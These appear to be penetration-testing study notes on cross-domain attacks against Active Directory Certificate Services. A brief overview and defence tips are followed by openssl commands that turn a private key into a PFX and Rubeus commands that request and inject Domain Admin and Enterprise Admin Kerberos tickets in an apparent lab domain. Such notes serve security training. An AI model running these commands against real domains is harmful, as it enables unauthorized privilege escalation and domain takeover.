# 🟢 AD CS

#### Cross Domain Attacks in Active Directory Certificate Services (AD CS)

Cross-domain attacks in AD CS exploit vulnerabilities in the configuration or implementation of Active Directory Certificate Services. AD CS is used to manage certificates for network security, including the authentication of users, computers, and services.&#x20;



{% @mailchimp/mailchimpSubscribe %}

The attacks aim to escalate privileges across domain boundaries, potentially allowing an attacker to gain unauthorized access to resources or perform actions with elevated privileges.

**Key Points:**

* **PKI Misconfiguration:** Attackers can exploit poorly configured Public Key Infrastructures (PKIs), leading to unauthorized certificate issuance.
* **Certificate Template Vulnerabilities:** Abuse of misconfigured certificate templates can allow attackers to issue certificates for themselves with elevated privileges.
* **Escalation of Privilege:** Attackers may use these vulnerabilities to escalate from a low-privileged user to higher-level administrative privileges across domains.
* **Defense Strategies:** Regularly audit AD CS configurations, limit the rights to manage CA and certificate templates, and implement monitoring for unusual certificate issuance activities.

#### Change the RSA into a PFX

> Paste the Private key in a file named : _cert.pem_

```
# linux
# openssl and provide a password
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

```
# windows
# openssl and provide a password
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem - keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\DA.pfx
```

#### 4. Request a TGT with the pfx

```
# Rubeus
# Request DA TGT and inject it
Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:password /ptt

# Request EA TGT and inject it
Rubeus.exe asktgt /user:techcorp.local\Administrator /dc:techcorp-dc.techcorp.local /certificate:C:\AD\Tools\EA.pfx /password:SecretPass@123 /nowrap /ptt
```

\


{% embed url="https://www.youtube.com/watch?v=ejmAIgxFRgM" %}
